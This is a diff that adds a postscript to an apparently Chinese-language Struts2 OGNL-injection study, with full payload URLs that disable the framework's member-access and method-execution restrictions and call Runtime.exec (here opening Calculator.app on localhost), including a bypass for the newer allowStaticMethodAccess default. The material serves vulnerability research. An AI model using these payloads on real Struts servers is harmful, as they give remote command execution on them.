@@ -94,3 +94,11 @@ doIntercept:176, ParametersInterceptor (com.opensymphony.xwork2.interceptor)
 http://127.0.0.1:8080/login.action?(%27\u0023_memberAccess.acceptProperties\u003d@java.util.Collections@EMPTY_SET%27)(abc)(def)&(%27\u0023context[\%27xwork.MethodAccessor.denyMethodExecution\%27]\u003dfalse%27)(abc)(def)&(%27\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET%27)(abc)(def)&('\u0040java.lang.Runtime%40'%2B'getRuntime().exec(%5Cu0023aa)')(%5Cu0023aa%5Cu003d'open%5Cu0020-a%5Cu0020Calculator.app')('y4tacker')
 ```
 
+## PS
+
+再多说一个，刚刚发现在高版本，这里指的是struts-core2.1.2以后，`allowStaticMethodAccess`默认设置为`false`了，还是可以修改的
+
+```java
+http://127.0.0.1:8080/login.action?(%27\u0023_memberAccess.allowStaticMethodAccess\u003dtrue%27)(abc)(def)&(%27\u0023_memberAccess.acceptProperties\u003d@java.util.Collections@EMPTY_SET%27)(abc)(def)&(%27\u0023context[\%27xwork.MethodAccessor.denyMethodExecution\%27]\u003dfalse%27)(abc)(def)&(%27\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET%27)(abc)(def)&('\u0040java.lang.Runtime%40'%2B'getRuntime().exec(%5Cu0023aa)')(%5Cu0023aa%5Cu003d'open%5Cu0020-a%5Cu0020Calculator.app')('y4tacker')
+```
+
